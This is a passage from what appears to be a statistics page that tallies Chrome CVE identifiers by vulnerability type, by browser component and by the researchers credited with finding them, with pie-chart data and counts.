-30577CVE-2021-30577CVE-2021-30580CVE-2021-30620CVE-2021-38016CVE-2021-38017CVE-2021-38019CVE-2021-38020 114 out of bounds read CVE-2011-1445CVE-2011-1455CVE-2011-2345CVE-2011-2843CVE-2011-2844CVE-2011-3234CVE-2011-2850CVE-2011-2851CVE-2011-2864CVE-2011-2858CVE-2011-3903CVE-2011-3906CVE-2011-3908CVE-2011-3910CVE-2011-3911CVE-2011-3025CVE-2011-3960CVE-2011-3962CVE-2011-3963CVE-2011-3970CVE-2011-3972CVE-2011-3059CVE-2011-3060CVE-2011-3104CVE-2011-3088CVE-2011-3093CVE-2011-3094CVE-2012-2820CVE-2012-2826CVE-2012-2865CVE-2012-2884CVE-2012-5130CVE-2012-5152CVE-2013-0833CVE-2013-0834CVE-2013-0888CVE-2013-0917CVE-2013-2838CVE-2013-2869CVE-2013-2875CVE-2013-2877CVE-2013-2878CVE-2013-2907CVE-2013-2917CVE-2013-2920CVE-2013-6623CVE-2013-6627CVE-2013-6640CVE-2014-1746CVE-2014-1746CVE-2014-3155CVE-2014-3155CVE-2015-1224CVE-2015-1225CVE-2016-1619CVE-2016-1626CVE-2016-1628CVE-2016-1646CVE-2016-1651CVE-2016-1685CVE-2016-1686CVE-2016-10403CVE-2016-1702CVE-2016-5186CVE-2017-5088CVE-2017-5071CVE-2017-5097CVE-2017-15388CVE-2017-15416CVE-2018-16066CVE-2018-16067CVE-2018-16069CVE-2018-16076CVE-2018-16083CVE-2018-18359CVE-2019-5798CVE-2019-5813CVE-2019-5835CVE-2019-5867CVE-2019-13706CVE-2019-13752CVE-2019-13753CVE-2019-20503CVE-2020-6455CVE-2020-6555CVE-2020-15960CVE-2020-15981CVE-2020-16041CVE-2021-21198CVE-2021-30536CVE-2021-30511CVE-2021-30575 92 heap buffer overflow CVE-2011-3926CVE-2011-3919CVE-2011-3019CVE-2015-1271CVE-2015-1273CVE-2015-1279CVE-2015-1283CVE-2016-1689CVE-2016-1691CVE-2017-5054CVE-2017-5054CVE-2017-5077CVE-2017-5112CVE-2017-5113CVE-2017-15408CVE-2018-6038CVE-2018-6062CVE-2018-6090CVE-2018-6126CVE-2018-6141CVE-2018-6120CVE-2018-6154CVE-2018-6156CVE-2018-6162CVE-2018-17469CVE-2018-18335CVE-2018-18338CVE-2018-18341CVE-2019-5770CVE-2019-5771CVE-2019-5790CVE-2019-5815CVE-2019-5836CVE-2019-13726CVE-2020-6452CVE-2020-6540CVE-2020-6510CVE-2020-6513CVE-2020-6517CVE-2020-6520CVE-2020-6524CVE-2020-6525CVE-2020-6534CVE-2020-6556CVE-2020-6548CVE-2020-15999CVE-2020-16024CVE-2020-16025CVE-2020-16028CVE-2021-21128CVE-2021-21152CVE-2021-21154CVE-2021-21155CVE-2021-21156CVE-2021-21148CVE-2021-21143CVE-2021-21144CVE-2021-21196CVE-2021-21197CVE-2021-21192CVE-2021-21159CVE-2021-21160CVE-2021-21161CVE-2020-27844CVE-2021-21233CVE-2021-21222CVE-2021-30521CVE-2021-30508CVE-2021-30516CVE-2021-30518CVE-2021-30568CVE-2021-30564CVE-2021-30614CVE-2021-38013CVE-2021-4101CVE-2021-4055CVE-2021-4058CVE-2021-4062CVE-2022-0301CVE-2022-0306CVE-2022-0310CVE-2022-0310CVE-2022-0311CVE-2022-0604CVE-2022-0454CVE-2022-1142CVE-2022-1143CVE-2022-0976CVE-2022-1483CVE-2022-1484CVE-2022-1638CVE-2022-1638 92 inappropriate implementation CVE-2018-18344CVE-2018-18345CVE-2018-18347CVE-2018-18348CVE-2018-18352CVE-2018-18353CVE-2018-20065CVE-2018-20067CVE-2018-20068CVE-2019-5754CVE-2019-5755CVE-2018-20073CVE-2019-5784CVE-2020-6503CVE-2020-6453CVE-2020-6426CVE-2020-6437CVE-2020-6440CVE-2020-6442CVE-2020-6447CVE-2020-6477CVE-2020-6478CVE-2020-6479CVE-2020-6489CVE-2020-6538CVE-2020-6514CVE-2020-6522CVE-2020-6526CVE-2020-6529CVE-2020-6561CVE-2020-6546CVE-2020-16000CVE-2020-6557CVE-2020-15979CVE-2020-15985CVE-2020-16019CVE-2020-16020CVE-2020-16029CVE-2020-16034CVE-2020-16036CVE-2020-16013CVE-2020-16016CVE-2021-21132CVE-2021-21135CVE-2021-21137CVE-2021-21139CVE-2021-21147CVE-2021-21175CVE-2021-21176CVE-2021-21178CVE-2021-21183CVE-2021-21184CVE-2021-21209CVE-2021-21210CVE-2021-21211CVE-2021-21215CVE-2021-21216CVE-2021-30507CVE-2021-30582CVE-2021-30618CVE-2021-38009CVE-2021-38010CVE-2021-38015CVE-2021-38018CVE-2021-38021CVE-2021-38022CVE-2022-0291CVE-2022-0292CVE-2022-0294CVE-2022-0305CVE-2022-0309CVE-2022-0610CVE-2022-0455CVE-2022-0462CVE-2022-0466CVE-2022-0467CVE-2022-1128CVE-2022-1129CVE-2022-1132CVE-2022-1137CVE-2022-1138CVE-2022-1139CVE-2022-1146CVE-2022-1482CVE-2022-1488CVE-2022-1497CVE-2022-1498CVE-2022-1499CVE-2022-1501CVE-2022-1637CVE-2022-1637 91 type confusion CVE-2011-2875CVE-2013-0912CVE-2013-2882CVE-2015-1217CVE-2015-1230CVE-2015-6788CVE-2015-6775CVE-2016-1643CVE-2016-1677CVE-2016-5161CVE-2017-5023CVE-2017-5057CVE-2017-5059CVE-2017-5070CVE-2017-5094CVE-2017-5108CVE-2017-5115CVE-2017-5116CVE-2017-15413CVE-2018-6064CVE-2018-6124CVE-2018-6157CVE-2018-6170CVE-2019-5757CVE-2019-5791CVE-2019-13730CVE-2019-13764CVE-2020-6418CVE-2020-6383CVE-2020-6430CVE-2020-6468CVE-2020-6537CVE-2020-6512CVE-2020-6533CVE-2021-21230CVE-2021-21224CVE-2021-30513CVE-2021-30517CVE-2021-30551CVE-2021-30588CVE-2021-30561CVE-2021-30563CVE-2021-30598CVE-2021-30599CVE-2021-38007CVE-2021-38012CVE-2021-4078CVE-2021-4056CVE-2021-4061CVE-2022-0457CVE-2022-1134CVE-2022-1096CVE-2022-1486CVE-2022-1364CVE-2022-1364 55 out of bounds write CVE-2011-2828CVE-2011-3900CVE-2011-3914CVE-2011-3095CVE-2012-2883CVE-2012-2874CVE-2013-6639CVE-2015-1232CVE-2015-1213CVE-2015-1214CVE-2015-1215CVE-2016-1645CVE-2016-1660CVE-2016-1653CVE-2016-5209CVE-2016-5210CVE-2017-5095CVE-2017-5099CVE-2017-5131CVE-2017-5133CVE-2017-15407CVE-2017-15409CVE-2018-6149CVE-2018-16065CVE-2018-16068CVE-2018-17480CVE-2018-18342CVE-2019-13728CVE-2019-13734CVE-2019-13735CVE-2020-6507CVE-2020-6523CVE-2020-15965CVE-2020-15995CVE-2021-30526CVE-2021-30509CVE-2021-30547CVE-2021-30565CVE-2021-30559CVE-2021-38014CVE-2021-4079 41 integer overflow CVE-2011-2829CVE-2012-2834CVE-2012-2896CVE-2012-5143CVE-2012-5149CVE-2012-5151CVE-2012-5154CVE-2013-0891CVE-2013-0899CVE-2013-2901CVE-2014-1744CVE-2014-1744CVE-2015-1219CVE-2015-6781CVE-2016-1684CVE-2016-5221CVE-2016-5223CVE-2016-5223CVE-2017-15422CVE-2018-6034CVE-2018-6065CVE-2018-6072CVE-2018-6092CVE-2018-6174CVE-2018-16070CVE-2019-5792CVE-2019-5795CVE-2019-5806CVE-2019-5820CVE-2019-5821CVE-2019-5855CVE-2019-5854CVE-2019-13736CVE-2020-6569CVE-2020-15974CVE-2020-15975CVE-2020-15986CVE-2021-21223CVE-2022-0608 39 incorrect security ui CVE-2018-18346CVE-2019-5767CVE-2019-13739CVE-2019-13740CVE-2019-13742CVE-2019-13743CVE-2019-13749CVE-2019-13756CVE-2019-13757CVE-2019-13759CVE-2019-13761CVE-2020-6475CVE-2020-6491CVE-2020-6494CVE-2020-6498CVE-2020-6528CVE-2020-6536CVE-2020-6564CVE-2020-6565CVE-2020-6571CVE-2020-6547CVE-2020-16031CVE-2020-16032CVE-2020-16033CVE-2021-21134CVE-2021-21170CVE-2021-21171CVE-2021-21229CVE-2021-21212CVE-2021-30540CVE-2021-30506CVE-2021-30584CVE-2021-4054CVE-2022-1495 34 insufficient data validation CVE-2018-18354CVE-2019-5773CVE-2019-13750CVE-2020-6460CVE-2020-6443CVE-2020-6484CVE-2020-6485CVE-2020-6490CVE-2020-6535CVE-2020-15964CVE-2020-15977CVE-2020-15978CVE-2020-15983CVE-2020-16015CVE-2020-16030CVE-2019-8075CVE-2020-16035CVE-2020-16040CVE-2021-21118CVE-2021-21123CVE-2021-21163CVE-2021-21164CVE-2021-21187CVE-2021-21227CVE-2021-21231CVE-2021-21208CVE-2021-4098CVE-2021-4059CVE-2022-1492CVE-2022-1494CVE-2022-1500 31 url spoof CVE-2017-15424CVE-2017-15425CVE-2017-15426CVE-2018-6041CVE-2018-6042CVE-2018-6050CVE-2018-6078CVE-2018-6098CVE-2018-6100CVE-2018-6102CVE-2018-6104CVE-2018-6105CVE-2018-6107CVE-2018-6108CVE-2018-6113CVE-2018-6133CVE-2018-6163CVE-2018-6165CVE-2018-6166CVE-2018-6167CVE-2018-6172CVE-2018-6173CVE-2018-6175CVE-2018-16079CVE-2018-16080CVE-2018-17464CVE-2018-17467CVE-2018-17473CVE-2018-17475CVE-2019-13701 30 memory corruption CVE-2011-2347CVE-2011-2806CVE-2011-3065CVE-2011-3052CVE-2012-5124CVE-2013-0879CVE-2013-0904CVE-2013-0904CVE-2013-0906CVE-2013-2855CVE-2013-2862CVE-2013-2863CVE-2013-2919CVE-2014-1705CVE-2014-1710CVE-2015-1280CVE-2015-1290CVE-2015-6761CVE-2015-6761CVE-2016-1661CVE-2018-17466CVE-2018-17470CVE-2019-5807CVE-2019-5853 24 cross origin bypass CVE-2011-2856CVE-2015-1210CVE-2015-1210CVE-2015-1303CVE-2015-1304CVE-2015-1291CVE-2015-1292CVE-2015-1293CVE-2015-6755CVE-2015-6768CVE-2015-6769CVE-2015-6770CVE-2015-6772CVE-2016-1672CVE-2016-1673CVE-2016-1674CVE-2016-1675CVE-2016-1676CVE-2016-1696CVE-2016-1697CVE-2016-5192CVE-2017-5069 22 heap overflow CVE-2011-1302CVE-2011-3889CVE-2011-3895CVE-2011-3018CVE-2016-1678CVE-2016-1681CVE-2016-5152CVE-2016-5154CVE-2016-5157CVE-2016-5158CVE-2016-5159CVE-2016-5182CVE-2017-5012CVE-2017-5014CVE-2017-5024CVE-2017-5025CVE-2017-5063CVE-2017-5125CVE-2017-5128CVE-2017-5130 20 out of bounds memory access CVE-2016-5200CVE-2016-5198CVE-2017-5009CVE-2017-5053CVE-2017-5053CVE-2018-6129CVE-2018-6130CVE-2018-6136CVE-2018-6142CVE-2018-6143CVE-2018-6144CVE-2020-6407CVE-2020-6530CVE-2021-21169CVE-2021-21225CVE-2021-30530CVE-2022-0470CVE-2022-1489 18 bad cast CVE-2011-1441CVE-2011-3027CVE-2011-3109CVE-2012-2866CVE-2012-2871CVE-2012-5136CVE-2012-5122CVE-2013-0828CVE-2013-2839CVE-2015-6758CVE-2016-1612CVE-2016-1632CVE-2017-5052CVE-2017-5052CVE-2018-6151CVE-2018-6151 16 All Time CVEs by ComponentWhere are the major component problem areas with Chrome?pie showData title All Time Chrome CVE Data by Component \"v8\" : 139 \"blink\" : 112 \"pdfium\" : 82 \"omnibox\" : 67 \"extensions\" : 61 \"skia\" : 54 \"webrtc\" : 33 \"devtools\" : 28 \"media\" : 27 \"autofill\" : 23 \"angle\" : 21 \"navigation\" : 18 \"pdf\" : 17 \"webgl\" : 17 \"dom\" : 16 \"developer tools\" : 15 Chrome Component CVEs Count v8 CVE-2011-2348CVE-2011-2332CVE-2011-2828CVE-2011-2852CVE-2011-2856CVE-2011-3886CVE-2011-3886CVE-2011-3900CVE-2011-3057CVE-2011-3111CVE-2011-3115CVE-2012-5120CVE-2012-5128CVE-2012-5153CVE-2013-2838CVE-2013-2882CVE-2013-2919CVE-2013-6638CVE-2013-6639CVE-2013-6640CVE-2014-1705CVE-2015-1230CVE-2015-1290CVE-2015-1304CVE-2015-6771CVE-2015-6764CVE-2016-1612CVE-2016-1646CVE-2016-1665CVE-2016-1653CVE-2016-1677CVE-2016-1678CVE-2016-5177CVE-2016-5172CVE-2016-5200CVE-2016-5198CVE-2016-9651CVE-2016-5213CVE-2016-5219CVE-2017-5012CVE-2017-5054CVE-2017-5053CVE-2017-5054CVE-2017-5053CVE-2017-5088CVE-2017-5070CVE-2017-5071CVE-2017-5098CVE-2017-5121CVE-2017-5122CVE-2017-5115CVE-2017-5116CVE-2017-15396CVE-2017-15406CVE-2017-15399CVE-2017-15429CVE-2018-6056CVE-2018-6061CVE-2018-6064CVE-2018-6065CVE-2018-6106CVE-2018-6136CVE-2018-6142CVE-2018-6143CVE-2018-6149CVE-2018-16065CVE-2018-17463CVE-2018-17465CVE-2018-17480CVE-2018-18342CVE-2018-18359CVE-2019-5755CVE-2019-5763CVE-2019-5784CVE-2019-5790CVE-2019-5791CVE-2019-5807CVE-2019-5813CVE-2019-13698CVE-2019-5831CVE-2019-5867CVE-2019-5877CVE-2019-5878CVE-2019-13728CVE-2019-13730CVE-2019-13735CVE-2019-13764CVE-2020-6418CVE-2020-6383CVE-2020-6453CVE-2020-6426CVE-2020-6419CVE-2020-6430CVE-2020-6448CVE-2020-6468CVE-2020-6507CVE-2020-6537CVE-2020-6512CVE-2020-6533CVE-2020-15965CVE-2020-15994CVE-2020-15995CVE-2020-15979CVE-2020-16013CVE-2020-16040CVE-2020-16042CVE-2021-21118CVE-2021-21156CVE-2021-21148CVE-2021-21195CVE-2021-21169CVE-2021-21227CVE-2021-21230CVE-2021-21231CVE-2021-21222CVE-2021-21224CVE-2021-21225CVE-2021-30536CVE-2021-30513CVE-2021-30517CVE-2021-30551CVE-2021-30588CVE-2021-30541CVE-2021-30561CVE-2021-30563CVE-2021-30598CVE-2021-30599CVE-2021-38007CVE-2021-38012CVE-2021-4102CVE-2021-4078CVE-2021-4061CVE-2022-0457CVE-2022-0470CVE-2022-1134CVE-2022-1096CVE-2022-1486CVE-2022-1364CVE-2022-1364 139 blink CVE-2015-1227CVE-2015-1284CVE-2015-1286CVE-2015-1299CVE-2015-1300CVE-2015-6755CVE-2015-6789CVE-2016-1614CVE-2016-1618CVE-2016-1643CVE-2016-1644CVE-2016-1630CVE-2016-1633CVE-2016-1634CVE-2016-1635CVE-2016-1660CVE-2016-1673CVE-2016-1675CVE-2016-1697CVE-2016-5147CVE-2016-5148CVE-2016-5150CVE-2016-5153CVE-2016-5161CVE-2016-5170CVE-2016-5171CVE-2016-5181CVE-2016-5182CVE-2016-5185CVE-2016-5192CVE-2016-5208CVE-2016-5207CVE-2016-5205CVE-2016-5204CVE-2016-5209CVE-2016-5225CVE-2017-5007CVE-2017-5006CVE-2017-5008CVE-2017-5010CVE-2017-5016CVE-2017-5022CVE-2017-5027CVE-2017-5052CVE-2017-5056CVE-2017-5052CVE-2017-5056CVE-2017-5059CVE-2017-5064CVE-2017-5065CVE-2017-5069CVE-2017-5079CVE-2017-5083CVE-2017-5093CVE-2017-5118CVE-2017-15386CVE-2017-15416CVE-2017-15419CVE-2018-6034CVE-2018-6048CVE-2018-6060CVE-2018-6076CVE-2018-6123CVE-2018-6124CVE-2018-6134CVE-2018-6135CVE-2018-6137CVE-2018-6145CVE-2018-6158CVE-2018-6168CVE-2018-6177CVE-2018-4117CVE-2018-16066CVE-2018-16075CVE-2018-16077CVE-2018-17468CVE-2018-17474CVE-2018-18337CVE-2018-18341CVE-2018-18346CVE-2018-18349CVE-2018-18350CVE-2019-5758CVE-2019-5769CVE-2019-5808CVE-2019-5809CVE-2019-5811CVE-2019-5814CVE-2019-5815CVE-2019-5842CVE-2019-5839CVE-2019-5869CVE-2019-13700CVE-2019-13741CVE-2020-6473CVE-2020-6474CVE-2020-6562CVE-2020-6552CVE-2020-16000CVE-2020-15968CVE-2020-15974CVE-2020-15985CVE-2020-16030CVE-2021-21122CVE-2021-21128CVE-2021-21193CVE-2021-21188CVE-2021-21203CVE-2021-21204CVE-2021-30606CVE-2021-30617CVE-2021-30620 112 pdfium CVE-2015-1225CVE-2015-1271CVE-2015-1273CVE-2015-1279CVE-2015-1282CVE-2015-6756CVE-2015-6758CVE-2015-6775CVE-2015-6776CVE-2015-6778CVE-2015-6779CVE-2016-1613CVE-2016-1619CVE-2016-1626CVE-2016-1628CVE-2016-1645CVE-2016-1681CVE-2016-1685CVE-2016-1686CVE-2016-10403CVE-2016-5151CVE-2016-5152CVE-2016-5154CVE-2016-5157CVE-2016-5158CVE-2016-5159CVE-2016-5183CVE-2016-5184CVE-2016-5206CVE-2016-5203CVE-2016-5210CVE-2016-5211CVE-2016-5216CVE-2016-5217CVE-2016-5220CVE-2016-5223CVE-2016-5223CVE-2017-5057CVE-2017-5095CVE-2017-5108CVE-2017-5111CVE-2017-5114CVE-2017-5126CVE-2017-5127CVE-2017-15408CVE-2017-15410CVE-2017-15411CVE-2018-6031CVE-2018-6072CVE-2018-6088CVE-2018-6144CVE-2018-6120CVE-2018-6170CVE-2018-16076CVE-2018-17469CVE-2018-17481CVE-2018-17481CVE-2018-18336CVE-2018-20065CVE-2019-5756CVE-2019-5762CVE-2019-5772CVE-2019-5792CVE-2019-5795CVE-2019-5805CVE-2019-5820CVE-2019-5821CVE-2019-5860CVE-2019-5855CVE-2019-13721CVE-2019-13706CVE-2019-13736CVE-2020-6458CVE-2020-6513CVE-2020-16002CVE-2020-15989CVE-2020-16029CVE-2021-21190CVE-2021-21217CVE-2021-21218CVE-2021-21219CVE-2022-0306 82 omnibox CVE-2015-1296CVE-2015-6782CVE-2016-1615CVE-2016-5218CVE-2016-5222CVE-2017-5013CVE-2017-5015CVE-2017-5060CVE-2017-5061CVE-2017-5067CVE-2017-5089CVE-2017-5072CVE-2017-5086CVE-2017-5076CVE-2017-5101CVE-2017-5105CVE-2017-5106CVE-2017-15389CVE-2017-15390CVE-2017-15420CVE-2017-15424CVE-2017-15425CVE-2017-15426CVE-2017-15427CVE-2018-6042CVE-2017-15420CVE-2018-6050CVE-2018-6078CVE-2018-6098CVE-2018-6100CVE-2018-6102CVE-2018-6104CVE-2018-6105CVE-2018-6107CVE-2018-6108CVE-2018-6133CVE-2018-6163CVE-2018-6165CVE-2018-6166CVE-2018-6167CVE-2018-6172CVE-2018-6173CVE-2018-6175CVE-2018-17459CVE-2018-17464CVE-2018-17467CVE-2018-17473CVE-2018-17475CVE-2018-18348CVE-2019-5775CVE-2019-5776CVE-2019-5777CVE-2019-5781CVE-2019-13739CVE-2019-13742CVE-2019-13746CVE-2019-13749CVE-2019-13757CVE-2019-13761CVE-2020-6441CVE-2020-6497CVE-2020-6565CVE-2020-6571CVE-2020-15984CVE-2021-21121CVE-2022-0295CVE-2022-0302 67 extensions CVE-2013-0919CVE-2015-1298CVE-2015-6788CVE-2015-6774CVE-2016-1622CVE-2016-1648CVE-2016-1632CVE-2016-1662CVE-2016-1655CVE-2016-1674CVE-2016-1687CVE-2016-1687CVE-2016-1700CVE-2016-5149CVE-2016-5201CVE-2017-5021CVE-2017-5094CVE-2017-15391CVE-2018-6035CVE-2018-6045CVE-2018-6046CVE-2018-6138CVE-2018-6176CVE-2018-6178CVE-2018-6179CVE-2018-6044CVE-2018-17477CVE-2018-18344CVE-2018-20066CVE-2019-5778CVE-2019-5793CVE-2019-5796CVE-2019-5838CVE-2019-13754CVE-2019-13755CVE-2020-6425CVE-2020-6454CVE-2020-6433CVE-2020-6435CVE-2020-6438CVE-2020-6440CVE-2020-6509CVE-2020-6554CVE-2020-15961CVE-2020-15963CVE-2020-15966CVE-2020-15973CVE-2020-16039CVE-2021-21126CVE-2021-21127CVE-2021-21143CVE-2021-21185CVE-2021-21228CVE-2021-21202CVE-2021-30545CVE-2021-30552CVE-2021-4055CVE-2022-0465CVE-2022-1137CVE-2022-1145CVE-2022-0972 61 skia CVE-2011-3927CVE-2011-3065CVE-2011-3104CVE-2012-2883CVE-2012-2884CVE-2012-2874CVE-2012-5130CVE-2012-5123CVE-2012-5123CVE-2013-0883CVE-2013-0888CVE-2015-1280CVE-2015-1294CVE-2015-6773CVE-2016-1637CVE-2016-1680CVE-2016-1691CVE-2016-1702CVE-2017-5014CVE-2017-5063CVE-2017-5077CVE-2017-5097CVE-2017-5102CVE-2017-5103CVE-2017-5113CVE-2017-5117CVE-2017-5119CVE-2017-5125CVE-2017-5131CVE-2017-5133CVE-2017-15388CVE-2017-15409CVE-2017-15417CVE-2017-15418CVE-2018-6062CVE-2018-6067CVE-2018-6069CVE-2018-6071CVE-2018-6090CVE-2018-6126CVE-2018-6141CVE-2018-6153CVE-2018-16070CVE-2018-18335CVE-2018-18343CVE-2018-18356CVE-2019-5785CVE-2019-5798CVE-2020-6540CVE-2020-6520CVE-2020-6523CVE-2020-6525CVE-2020-6548CVE-2021-21147 54 webrtc CVE-2016-1639CVE-2017-5009CVE-2017-5068CVE-2018-6129CVE-2018-6130CVE-2018-6132CVE-2018-6155CVE-2018-6156CVE-2018-6157CVE-2018-16071CVE-2018-16083CVE-2019-5760CVE-2019-5764CVE-2020-6444CVE-2020-6467CVE-2020-6514CVE-2020-6529CVE-2020-6534CVE-2020-6570CVE-2020-15969CVE-2020-15987CVE-2020-16026CVE-2020-16028CVE-2020-16034CVE-2020-16044CVE-2021-21191CVE-2021-21162CVE-2021-30523CVE-2021-30611CVE-2021-30612CVE-2021-30602CVE-2021-4079CVE-2022-1133 33 devtools CVE-2016-1699CVE-2016-5165CVE-2016-5186CVE-2016-5212CVE-2017-5011CVE-2017-15393CVE-2018-6039CVE-2018-6152CVE-2018-6152CVE-2018-6151CVE-2018-6101CVE-2018-6111CVE-2018-6112CVE-2018-6151CVE-2018-6152CVE-2018-16081CVE-2019-5768CVE-2019-5783CVE-2020-6434CVE-2021-21132CVE-2021-21137CVE-2021-21138CVE-2021-30567CVE-2021-30571CVE-2021-30576CVE-2021-30581CVE-2021-30618CVE-2022-0301 28 media CVE-2015-1232CVE-2016-1654CVE-2016-1689CVE-2018-18352CVE-2019-13688CVE-2019-13687CVE-2019-5870CVE-2019-5876CVE-2019-13699CVE-2020-6452CVE-2020-6424CVE-2020-6420CVE-2020-6572CVE-2020-6466CVE-2020-6566CVE-2020-6544CVE-2020-6547CVE-2020-6549CVE-2020-15964CVE-2020-16001CVE-2020-15986CVE-2020-16038CVE-2021-21119CVE-2021-21152CVE-2021-30578CVE-2021-30616CVE-2021-38008 27 autofill CVE-2016-1690CVE-2016-1701CVE-2018-6037CVE-2018-16078CVE-2019-5810CVE-2020-6521CVE-2020-6560CVE-2020-15990CVE-2021-21177CVE-2021-21181CVE-2021-21215CVE-2021-21216CVE-2021-30521CVE-2021-30514CVE-2021-30546CVE-2021-30572CVE-2021-30575CVE-2021-30619CVE-2021-30621CVE-2021-30624CVE-2021-4054CVE-2021-4065CVE-2022-0309 23 angle CVE-2013-2901CVE-2016-5221CVE-2018-17466CVE-2019-5806CVE-2019-5836CVE-2020-6463CVE-2020-6542CVE-2021-21233CVE-2021-30547CVE-2021-30559CVE-2021-30604CVE-2021-4100CVE-2021-4058CVE-2021-4066CVE-2022-0606CVE-2022-0454CVE-2022-0975CVE-2022-0978CVE-2022-1479CVE-2022-1639CVE-2022-1639 21 navigation CVE-2016-1647CVE-2018-6041CVE-2018-6113CVE-2018-18347CVE-2018-18351CVE-2018-20067CVE-2018-20068CVE-2018-20069CVE-2019-13701CVE-2019-13738CVE-2019-13758CVE-2020-15978CVE-2021-21146CVE-2021-21226CVE-2021-21205CVE-2021-21211CVE-2021-30615CVE-2021-38018 18 pdf CVE-2011-2839CVE-2011-2841CVE-2011-2861CVE-2011-3911CVE-2011-3110CVE-2011-3110CVE-2011-3110CVE-2011-3110CVE-2011-3110CVE-2011-3110CVE-2011-3113CVE-2011-3097CVE-2011-3097CVE-2012-2828CVE-2012-2852CVE-2012-2844CVE-2013-0897 17 webgl CVE-2012-2896CVE-2012-5129CVE-2015-1219CVE-2017-5112CVE-2017-5128CVE-2018-6038CVE-2018-6047CVE-2018-6073CVE-2018-6079CVE-2018-6154CVE-2018-6162CVE-2019-5770CVE-2020-6422CVE-2020-6555CVE-2021-30554CVE-2021-30568CVE-2022-1482 17 dom CVE-2011-2342CVE-2013-2884CVE-2013-2918CVE-2015-1209CVE-2015-1209CVE-2015-1209CVE-2015-1218CVE-2015-1223CVE-2015-1303CVE-2015-1291CVE-2015-1293CVE-2015-6768CVE-2015-6770CVE-2015-6772CVE-2015-6777CVE-2016-1623 16 developer tools CVE-2011-1816CVE-2019-5819CVE-2019-13748CVE-2020-6443CVE-2020-6447CVE-2020-6469CVE-2020-6471CVE-2020-6472CVE-2020-6482CVE-2020-6489CVE-2020-6495CVE-2020-6518CVE-2020-6530CVE-2020-16027CVE-2021-4063 15 GOAT Chrome ResearcherWho has found the most CVEs?pie showData title GOAT Chrome Researcher \"anonymous\" : 125 \"khalil zhani\" : 92 \"miaubiz\" : 71 \"david erceg\" : 58 \"atte kettunen of ouspg\" : 57 \"rob wu\" : 38 \"cloudfuzzer\" : 36 \"sergei glazunov of google project zero\" : 33 \"jun kokatsu (@shhnjk)\" : 27 \"jun kokatsu, microsoft browser vulnerability research\" : 25 \"google chrome security team (inferno)\" : 24 \"mariusz mlynski\" : 24 \"aki helin of ouspg\" : 22 \"sergey glazunov\" : 21 \"mateusz jurczyk of google security team\" : 21 \"arthur gerkis\" : 18 GOAT CVE Researcher CVEs Count anonymous CVE-2015-1210CVE-2015-1211CVE-2015-1210CVE-2015-1211CVE-2015-1232CVE-2015-1216CVE-2015-1217CVE-2015-1291CVE-2015-1295CVE-2015-6756CVE-2015-6788CVE-2015-6765CVE-2015-6766CVE-2015-6767CVE-2015-6771CVE-2015-6774CVE-2016-1613CVE-2016-1629CVE-2016-1622CVE-2016-1647CVE-2016-1648CVE-2016-1632CVE-2016-1663CVE-2016-1652CVE-2016-1696CVE-2016-5147CVE-2016-5148CVE-2016-5150CVE-2016-5151CVE-2016-5154CVE-2016-5155CVE-2016-5157CVE-2016-5164CVE-2016-5177CVE-2016-5170CVE-2016-5171CVE-2016-5173CVE-2016-5181CVE-2016-5183CVE-2016-5184CVE-2016-5205CVE-2016-5203CVE-2016-5211CVE-2016-5216CVE-2017-5056CVE-2017-5056CVE-2017-5062CVE-2017-5074CVE-2017-5094CVE-2017-5095CVE-2017-5097CVE-2017-5100CVE-2017-5102CVE-2017-5103CVE-2017-5113CVE-2017-5119CVE-2017-15401CVE-2017-5124CVE-2017-5125CVE-2017-5131CVE-2017-15429CVE-2017-15409CVE-2018-6031CVE-2018-6062CVE-2018-6071CVE-2018-6087CVE-2018-6088CVE-2018-6121CVE-2018-6170CVE-2018-6179CVE-2018-17481CVE-2018-17481CVE-2018-18335CVE-2018-18340CVE-2019-5756CVE-2019-5762CVE-2019-5805CVE-2019-5860CVE-2019-13736CVE-2020-6453CVE-2020-6460CVE-2020-6423CVE-2020-6572CVE-2020-6509CVE-2020-6493CVE-2020-6532CVE-2020-6534CVE-2020-6545CVE-2020-6554CVE-2020-15960CVE-2020-15995CVE-2020-15968CVE-2020-15969CVE-2020-15972CVE-2020-15975CVE-2020-16029CVE-2020-16013CVE-2020-16017CVE-2020-16039CVE-2021-21119CVE-2021-21152CVE-2021-21157CVE-2021-21145CVE-2021-21193CVE-2021-21162CVE-2021-21179CVE-2021-21214CVE-2021-30554CVE-2021-30553CVE-2021-30562CVE-2021-30563CVE-2021-30616CVE-2021-37975CVE-2021-37996CVE-2021-4102CVE-2022-0291CVE-2022-0610CVE-2022-0458CVE-2022-1127CVE-2022-1133CVE-2022-1096CVE-2022-0979CVE-2022-1485CVE-2022-1635CVE-2022-1635 125 khalil zhani CVE-2013-2843CVE-2013-2914CVE-2013-6621CVE-2014-1732CVE-2015-6780CVE-2016-1639CVE-2016-1693CVE-2016-5212CVE-2016-5213CVE-2017-5011CVE-2017-5058CVE-2017-5065CVE-2017-5067CVE-2017-5073CVE-2017-5079CVE-2017-5080CVE-2017-5083CVE-2017-5104CVE-2017-15424CVE-2018-6042CVE-2018-6077CVE-2018-6078CVE-2018-6098CVE-2018-6102CVE-2018-6103CVE-2018-6104CVE-2018-6105CVE-2018-6107CVE-2018-6108CVE-2018-6111CVE-2018-6113CVE-2018-6133CVE-2018-6163CVE-2018-6172CVE-2018-6173CVE-2018-6175CVE-2018-6178CVE-2018-16080CVE-2018-17467CVE-2018-17473CVE-2018-17476CVE-2019-5777CVE-2019-5801CVE-2019-5812CVE-2019-5833CVE-2019-5834CVE-2019-13685CVE-2019-5873CVE-2019-5875CVE-2019-13667CVE-2019-13669CVE-2019-13674CVE-2019-13703CVE-2019-13708CVE-2019-13718CVE-2019-13719CVE-2019-13740CVE-2019-13742CVE-2019-13749CVE-2019-13756CVE-2019-13757CVE-2019-13758CVE-2019-13761CVE-2020-6475CVE-2020-6478CVE-2020-6505CVE-2020-6496CVE-2020-6564CVE-2020-6565CVE-2020-16001CVE-2020-16003CVE-2020-15993CVE-2020-16033CVE-2020-16038CVE-2021-21151CVE-2021-21155CVE-2021-21142CVE-2021-21196CVE-2021-21159CVE-2021-21161CVE-2021-21189CVE-2021-30542CVE-2021-30543CVE-2021-30520CVE-2021-37961CVE-2022-1125CVE-2022-0977CVE-2022-1489CVE-2022-1633CVE-2022-1634CVE-2022-1633CVE-2022-1634 92 miaubiz 